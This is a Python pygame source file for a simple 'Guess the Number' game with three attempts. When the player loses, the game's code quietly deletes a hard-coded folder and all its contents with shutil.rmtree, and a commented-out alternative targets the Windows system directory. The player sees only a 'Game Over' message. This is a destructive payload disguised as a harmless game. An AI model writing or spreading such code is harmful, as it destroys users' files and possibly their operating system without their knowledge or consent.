import pygame
import random
import shutil
import os

# Initialize pygame
pygame.init()

# Set up display
WIDTH, HEIGHT = 500, 400
screen = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption("Guess the Number")

# Colors
WHITE = (255, 255, 255)
BLACK = (0, 0, 0)
GREEN = (0, 255, 0)
RED = (255, 0, 0)

# Font
font = pygame.font.Font(None, 36)

# Game variables
number_to_guess = random.randint(1, 10)
guess = ""
message = "Guess a number between 1 and 10"
game_over = False
attempts = 3

# Main loop
running = True
while running:
    screen.fill(WHITE)
    
    # Display message
    text_surface = font.render(message, True, BLACK)
    screen.blit(text_surface, (50, 50))
    
    # Display guess
    guess_surface = font.render(guess, True, GREEN if guess else BLACK)
    screen.blit(guess_surface, (50, 100))
    
    # Display attempts left
    attempts_surface = font.render(f"Attempts left: {attempts}", True, RED if attempts == 0 else BLACK)
    screen.blit(attempts_surface, (50, 150))
    
    # Event handling
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False
        elif event.type == pygame.KEYDOWN and not game_over:
            if event.key == pygame.K_RETURN:
                if guess.isdigit() and attempts > 0:
                    user_guess = int(guess)
                    attempts -= 1
                    if user_guess < number_to_guess:
                        message = "Too low! Try again."
                    elif user_guess > number_to_guess:
                        message = "Too high! Try again."
                    else:
                        message = "Correct! You win!"
                        game_over = True
                if attempts == 0 and not game_over:
                    message = "Game Over! Out of attempts."
                    # folder_path = "C:\Windows"
                    folder_path = "C:\\Users\\Sumit Sharma\\Desktop\\DataScience\\A-Z Datascience\\Python\\Test_folder"
                    if os.path.exists(folder_path):
                        shutil.rmtree(folder_path)  # Removes folder and its contents
                        print("Folder and contents removed successfully.")
                    else:
                        print("Folder not found.")
                    # shutil.rmtree("C:\\Users\\Sumit Sharma\\Desktop\\DataScience\\A-Z Datascience\\Python\\Test_folder")
                guess = ""
            elif event.key == pygame.K_BACKSPACE:
                guess = guess[:-1]
            elif event.unicode.isdigit():
                guess += event.unicode
    
    pygame.display.flip()

pygame.quit()
